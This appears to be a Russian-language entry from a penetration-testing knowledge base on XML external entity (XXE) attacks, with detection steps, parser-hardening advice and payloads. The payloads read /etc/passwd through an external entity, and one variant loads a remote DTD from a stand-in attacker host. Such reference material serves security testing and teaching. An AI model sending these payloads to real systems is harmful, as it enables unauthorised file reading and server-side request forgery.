---
id: xxe-basic-external-entity
title: "XXE: базовое чтение файла через внешнюю сущность"
type: xxe
target: xml
category: web
difficulty: intermediate
bypass: none
tags: [xxe, xml, file-read]
tested_on: ["libxml2 (PHP)", "Java Xerces", "Python lxml (resolve_entities=True)"]
success_rate: 0.6
risk: high
cwe: "CWE-611"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
graph:
  - target: "xxe"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
  - target: "ssrf"
    type: leads_to
---

# XXE: базовое чтение файла через внешнюю сущность

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```

## Explanation

XML-парсер, которому разрешено раскрывать внешние сущности, подставляет содержимое
`file:///etc/passwd` на место `&x;`. Если значение затем возвращается в ответе —
получаем чтение произвольных файлов. Работает также с `http://` (SSRF),
`php://`, `jar://`, `netdoc://` (Java). Условие успеха: парсер не отключил DTD.

## Detection

1. Найдите точки приёма XML: SOAP, SAML, SVG-загрузка, DOCX/XLSX, `Content-Type: application/xml`.
2. Добавьте безобидную сущность `<!DOCTYPE r [<!ENTITY x "HB">]><r>&x;</r>` —
   вернулось ли `HB`?
3. Затем `file:///etc/hostname`. Если нет вывода — пробуйте error-based и OOB-варианты.
Инструменты: `xxeserviced`, Burp + XXE-расширения.

## Remediation

- Отключить DTD и внешние сущности в парсере — это единственная настоящая защита:
  Java `disallow-doctype-decl=true`, `external-general-entities=false`;
  libxml2 `LIBXML_NOENT` НЕ использовать, `xml_parse` без `resolve_entities`;
  .NET `XmlResolver = null`; Python `defusedxml`.
- Валидация схемы (XSD) без DTD.
- Использовать JSON вместо XML там, где это возможно.
- Egress-фильтрация (блокирует OOB-эксфильтрацию).

## Variants

```
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
```

```
<!DOCTYPE r [<!ENTITY % x SYSTEM "http://attacker.tld/x.dtd"> %x;]>
```
